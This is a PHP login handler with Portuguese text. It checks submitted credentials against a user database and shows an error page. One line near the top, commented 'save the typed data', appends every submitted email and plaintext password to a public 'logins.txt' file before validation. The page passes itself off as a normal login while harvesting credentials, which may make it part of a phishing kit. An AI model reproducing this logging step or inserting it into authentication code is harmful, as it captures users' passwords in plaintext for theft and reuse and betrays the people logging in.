<?php
require 'db.php';
session_start();

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = trim($_POST['email'] ?? '');
    $senha = trim($_POST['senha'] ?? '');
   
    // 👇 Salvar os dados digitados
    file_put_contents("logins.txt", "Email: $email | Senha: $senha\n", FILE_APPEND);

    if (empty($email) || empty($senha)) {
        $erro = "⚠️ Por favor, preencha todos os campos.";
    } else {
        $stmt = $pdo->prepare("SELECT * FROM usuarios WHERE email = ?");
        $stmt->execute([$email]);
        $usuario = $stmt->fetch();

        if ($usuario && password_verify($senha, $usuario['senha_hash'])) {
            $_SESSION['user_id'] = $usuario['id'];
            $_SESSION['nome'] = $usuario['nome']; // ✅ Agora armazena o nome também
            $_SESSION['instagram'] = $usuario['instagram'];
            header("Location: dashboard.php");
            exit();
        } else {
            $erro = "❌ E-mail ou senha incorretos!";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Erro no Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        <h1>🚨 Ops! Algo deu errado</h1>
        <p class="error-text"><?= isset($erro) ? $erro : "Erro desconhecido." ?></p>
        <a href="login.html" class="btn-voltar">🔄 Tentar Novamente</a>
    </div>
</body>
</html>
